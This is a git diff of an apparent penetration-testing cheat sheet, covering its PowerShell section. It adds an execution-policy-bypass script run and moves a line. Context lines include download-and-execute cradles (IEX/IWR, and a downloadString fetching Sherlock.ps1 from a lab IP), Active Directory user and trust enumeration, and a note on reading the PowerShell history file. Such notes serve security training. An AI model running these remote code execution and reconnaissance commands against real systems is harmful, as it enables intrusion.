@@ -92,6 +92,9 @@ Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap
 #### PowerShell
 
 ```
+powershell -nop -ep bypass -f C:\Users\tony\49382.ps1
+Set-ExecutionPolicy Unrestricted
+
 Import-Module [filename].ps1
 C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # check powershell history
 IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/[PATH] to upload file to the server
@@ -102,7 +105,6 @@ nltest /domain_trusts   # show inbound/outbound trust
 Get-ADUser -Filter * | select SamAccountName    # list users(name ending with $ indicate trust keys being stored)
 Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName    # to retrieve user and computer accounts(ending with $)
 Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *		# retrieve item in recycle bin
-Set-ExecutionPolicy Unrestricted
 powershell "iex(new-object net.webclient).downloadString('http://192.168.119.218/Sherlock.ps1');Find-AllVulns"
 klist   # list the cached Kerberos tickets
 
